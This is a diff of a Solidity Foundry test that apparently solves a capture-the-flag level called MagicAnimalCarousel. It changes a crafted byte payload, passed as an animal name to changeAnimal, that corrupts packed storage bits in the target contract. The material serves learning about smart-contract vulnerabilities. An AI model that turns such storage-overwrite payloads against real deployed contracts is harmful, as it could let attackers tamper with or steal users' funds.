@@ -116,8 +116,9 @@ contract TestMagicAnimalCarousel is Test, Utils {
     function testSolve() public checkSolvedByPlayer{
         string memory dog = "Dog";
         instance.setAnimalAndSpin(dog);
-        bytes memory name = abi.encodePacked(bytes12(bytes32(uint256(type(uint96).max) << 160)));
-        address(instance).call(abi.encodeWithSignature("changeAnimal(string,uint256)", name, 1));
+        bytes memory name = abi.encodePacked(bytes12(bytes32(uint256(1) << 176)) | bytes12(bytes32(uint256(type(uint16).max) << 160)));
+        instance.changeAnimal(string(name), 1);
+        // address(instance).call(abi.encodeWithSignature("changeAnimal(string,uint256)", name, 1));
         instance.setAnimalAndSpin(dog);
 
     }
